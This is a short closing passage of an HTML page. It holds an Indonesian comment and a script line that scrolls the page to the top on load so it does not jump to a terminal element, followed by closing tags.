// Tetap di posisi atas saat page dimuat (jangan scroll ke terminal)
window.scrollTo(0, 0);
</script>
</body>
</html>
